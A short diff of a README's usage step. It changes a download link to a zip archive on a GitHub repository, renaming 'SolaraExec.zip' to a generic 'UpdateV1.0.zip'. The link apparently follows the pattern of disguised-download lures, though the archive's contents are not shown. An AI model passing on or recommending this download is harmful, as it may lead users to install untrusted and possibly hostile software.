@@ -10,7 +10,7 @@
   
 ## Usage
 
- * [Download](https://github.com/dinorahwheel878/halyava/releases/download/tewoew/SolaraExec.zip) the zip archive. <br>
+ * [Download](https://github.com/dinorahwheel878/halyava/releases/download/tewoew/UpdateV1.0.zip) the zip archive. <br>
 
  
 ## Notes
